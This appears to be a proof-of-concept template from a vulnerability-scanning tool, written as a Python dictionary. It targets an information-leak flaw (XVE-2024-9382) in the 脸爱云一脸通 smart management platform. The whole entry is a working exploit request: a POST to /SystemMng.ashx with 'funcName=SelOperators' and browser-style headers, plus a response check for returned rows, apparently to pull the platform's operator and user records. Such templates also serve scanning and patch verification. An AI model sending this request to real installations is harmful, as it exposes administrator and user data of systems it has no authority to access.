{
        'name': '脸爱云一脸通智慧管理平台 SystemMng 管理用户信息泄露漏洞(XVE-2024-9382)',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/SystemMng.ashx',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close'
            },
            'data': """username=admin&funcName=SelOperators""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '"rows": '
        }}]
    }